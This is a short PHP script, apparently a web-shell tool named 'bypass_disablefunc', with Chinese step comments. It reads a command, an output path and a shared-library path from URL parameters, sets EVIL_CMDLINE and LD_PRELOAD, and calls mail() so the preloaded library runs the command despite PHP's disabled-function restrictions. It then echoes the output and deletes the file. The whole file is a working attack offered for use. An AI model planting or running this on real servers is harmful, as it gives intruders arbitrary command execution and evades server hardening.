<?php
    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php";

    $cmd = $_GET["cmd"];
    $out_path = $_GET["outpath"];
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";#第一步

    putenv("EVIL_CMDLINE=" . $evil_cmdline);#第二步

    $so_path = $_GET["sopath"];
    putenv("LD_PRELOAD=" . $so_path);#第三步

    mail("", "", "", "");#第四步

    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);#第七步
